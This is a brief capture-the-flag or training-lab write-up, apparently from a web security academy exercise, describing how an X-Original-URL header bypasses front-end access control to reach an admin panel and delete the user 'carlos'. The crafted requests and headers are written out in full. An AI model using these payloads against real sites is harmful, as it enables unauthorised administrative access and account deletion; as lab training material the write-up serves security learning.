URL-based access control bypass (X-Original-URL)

Intercepted request and added:

X-Original-URL: /admin

This bypassed front-end restrictions and allowed access to the hidden admin panel.

Then performed deletion via:

GET /admin/delete?username=carlos

Alternatively bypassed deletion endpoint using:

X-Original-URL: /admin/delete
GET /?username=carlos

Result: user carlos deleted and lab solved.
